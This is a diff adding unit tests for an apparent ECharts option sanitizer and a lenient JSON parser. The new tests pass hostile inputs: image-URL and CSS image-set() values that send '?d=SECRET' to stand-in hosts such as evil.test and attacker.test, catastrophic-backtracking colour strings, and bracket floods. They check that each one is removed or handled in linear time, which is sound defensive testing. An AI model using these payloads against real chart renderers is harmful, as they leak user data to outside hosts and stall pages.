@@ -60,6 +60,25 @@ describe('sanitizeEChartsOption', () => {
         expect(clean['title']).toEqual({ text: 'Curl (cURL) usage' });
     });
 
+    it('drops emptyImage:// too, which ECharts reads as image:// once it strips "empty"', () => {
+        const clean = sanitizeEChartsOption({
+            legend: { icon: 'emptyImage://https://evil.test/legend.png?d=SECRET' },
+            dataZoom: [{ type: 'slider', handleIcon: 'emptyimage://https://evil.test/handle.png', moveHandleIcon: 'EMPTYIMAGE://x' }],
+            series: [{
+                type: 'line',
+                symbol: 'emptyImage://https://evil.test/sym.png',
+                data: [{ value: 1, symbol: 'emptyimage://https://evil.test/item.png' }, 2],
+                markPoint: { symbol: 'emptyImage://https://evil.test/pin.png', data: [{ type: 'max' }] },
+                itemStyle: { decal: { symbol: 'emptyImage://https://evil.test/decal.png' } },
+            }],
+            aria: { decal: { show: true, decals: [{ symbol: 'emptyImage://https://evil.test/aria.png' }] } },
+        })!;
+        expect(JSON.stringify(clean)).not.toMatch(/evil\.test|image:\/\//i);
+        // A symbol that only looks like it stays.
+        const kept = sanitizeEChartsOption({ series: [{ type: 'line', symbol: 'emptyCircle', data: [1] }] })!;
+        expect((kept['series'] as Array<Record<string, unknown>>)[0]!['symbol']).toBe('emptyCircle');
+    });
+
     it('drops a CSS url() spelled with escapes, which a fill or a stroke still resolves', () => {
         // zrender copies a colour string verbatim into an SVG `fill` / `stroke` attribute,
         // and CSS reads `u\rl(`, `u\72 l(` and `\75 rl(` as `url(`: a request.
@@ -102,6 +121,53 @@ describe('sanitizeEChartsOption', () => {
         expect((gauge['series'] as Array<Record<string, any>>)[0]!['axisLine']['lineStyle']['color']).toEqual([[0.3, '#67e0e3'], [1, null]]);
     });
 
+    it('checks a colour in linear time, whatever the string', () => {
+        // `rgb(` + spaces + `x` used to backtrack cubically: 4 KB took 15 s.
+        const adversarial = ['rgb(' + ' '.repeat(50_000) + 'x', 'hsl(' + '1 '.repeat(25_000) + 'x', 'rgb(' + ' '.repeat(50_000), ' '.repeat(50_000) + 'x', 'a'.repeat(50_000) + '!'];
+        for (const colour of adversarial) {
+            const started = performance.now();
+            const clean = sanitizeEChartsOption({ color: [colour], series: [{ itemStyle: { color: colour } }] })!;
+            expect(performance.now() - started).toBeLessThan(50);
+            expect(JSON.stringify(clean)).toBe('{"color":[null],"series":[{"itemStyle":{}}]}');
+        }
+    });
+
+    it('holds a colour to 64 characters', () => {
+        const long = `rgba(${'0,'.repeat(40)}0)`;
+        expect(long.length).toBeGreaterThan(64);
+        expect(sanitizeEChartsOption({ color: [long] })!['color']).toEqual([null]);
+        const fits = 'rgba(255, 255, 255, 0.5)';
+        expect(sanitizeEChartsOption({ color: [fits] })!['color']).toEqual([fits]);
+        expect(sanitizeEChartsOption({ color: ['hsl(120deg 50% 50%)'] })!['color']).toEqual(['hsl(120deg 50% 50%)']);
+    });
+
+    it('takes only a keyword as a cursor, since the browser fetches an image-set()', () => {
+        const clean = sanitizeEChartsOption({
+            series: [
+                { type: 'bar', cursor: 'image-set("https://attacker.test/?d=SECRET" 1x), auto' },
+                { type: 'bar', cursor: '-webkit-image-set("https://attacker.test/x" 1x), auto' },
+                { type: 'bar', cursor: 'pointer' },
+                { type: 'bar', cursor: 'not-allowed' },
+            ],
+            graphic: [{ type: 'rect', cursor: 'image-set("https://attacker.test/g" 1x), auto' }],
+        })!;
+        expect((clean['series'] as Array<Record<string, unknown>>).map((s) => s['cursor'])).toEqual([undefined, undefined, 'pointer', 'not-allowed']);
+        expect((clean['graphic'] as Array<Record<string, unknown>>)[0]!['cursor']).toBeUndefined();
+    });
+
+    it('holds the dataZoom grab cursors to a keyword too', () => {
+        const evil = 'image-set("https://attacker.test/?d=SECRET" 1x), grab';
+        const clean = sanitizeEChartsOption({
+            dataZoom: [
+                { type: 'inside', cursorGrab: evil, cursorGrabbing: evil },
+                { type: 'inside', cursorGrab: 'grab', cursorGrabbing: 'grabbing' },
+            ],
+        })!;
+        const [bad, good] = clean['dataZoom'] as Array<Record<string, unknown>>;
+        expect(bad).toEqual({ type: 'inside' });
+        expect(good).toEqual({ type: 'inside', cursorGrab: 'grab', cursorGrabbing: 'grabbing' });
+    });
+
     it('drops a regular expression a dataset filter would compile', () => {
         // `{ reg: '^(a+)+$' }` is `new RegExp(…)` run on every value: a catastrophic backtrack.
         const clean = sanitizeEChartsOption({
@@ -141,6 +207,24 @@ describe('sanitizeEChartsOption', () => {
         expect(clean['legend']).toEqual({ textStyle: {} });
     });
 
+    it('drops a font value under the legacy keys too, and a colour under textFill / textStroke', () => {
+        const image = ';mask-image:image-set("https://attacker.example/m" 1x);cursor:image-set("https://attacker.example/c" 1x),auto';
+        const clean = sanitizeEChartsOption({
+            graphic: [{ type: 'text', style: { text: 'hi', textFont: 'bold 40px sans-serif' + image, font: 'bold 12px serif' } }],
+            toolbox: { feature: { restore: { emphasis: { iconStyle: {
+                textFontFamily: 'sans-serif' + image, textFontStyle: 'x' + image, textFontSize: '12' + image, textFontWeight: 'bold' + image,
+                textFill: 'red;mask-image:image-set("https://attacker.example/f" 1x)', textStroke: 'blue;x:y',
+            } } } } },
+        })!;
+        expect(JSON.stringify(clean)).not.toContain('attacker');
+        expect(JSON.stringify(sanitizeEChartsOption({ title: { text: 'a; -webkit-image-set("https://attacker.example/w" 1x)', subtext: 'x cross-fade(a, b)', link2: 'ok' } }))).toBe('{"title":{"link2":"ok"}}');
+        expect(clean['graphic']).toEqual([{ type: 'text', style: { text: 'hi', font: 'bold 12px serif' } }]);
+        expect(JSON.stringify(clean['toolbox'])).toBe('{"feature":{"restore":{"emphasis":{"iconStyle":{}}}}}');
+        const kept = sanitizeEChartsOption({ toolbox: { feature: { restore: { emphasis: { iconStyle: { textFontFamily: 'Inter, sans-serif', textFill: 'red' } } } } } })!;
+        expect(JSON.stringify(kept)).toContain('Inter, sans-serif');
+        expect(JSON.stringify(kept)).toContain('"textFill":"red"');
+    });
+
     it('drops prototype keys and what is nested past any real option', () => {
         const parsed = JSON.parse('{"__proto__": {"polluted": true}, "constructor": 1, "series": []}');
         const clean = sanitizeEChartsOption(parsed)!;
@@ -177,6 +261,21 @@ describe('parseOption', () => {
         expect(parseOption('', true)).toBeUndefined();
         expect(parseOption('{', true)).toEqual({});
         expect(parseOption('nope', true)).toBeUndefined();
+    });
+
+    it('reads a fence of nothing but open brackets in linear time', () => {
+        // Each cut used to write out the closers for every bracket open: 40,000 took 5 s, per frame.
+        for (const body of ['['.repeat(50_000), '['.repeat(20_000) + ','.repeat(10_000), '{"a":'.repeat(20_000)]) {
+            const source = '{"series":[{"type":"bar","data":[1,2,3]}],"x":' + body;
+            const started = performance.now();
+            parseOption(source, true);
+            expect(performance.now() - started).toBeLessThan(500);
+        }
+    });
+
+    it('closes the brackets that were open at the cut it keeps', () => {
+        expect(parseOption('{"a":[{"b":[1,2],"c":{"d":[3', true)).toEqual({ a: [{ b: [1, 2], c: { d: [] } }] });
+        expect(parseOption('{"a":[1,2],"b":[[3,4],[5', true)).toEqual({ a: [1, 2], b: [[3, 4], []] });
     });
 });
 
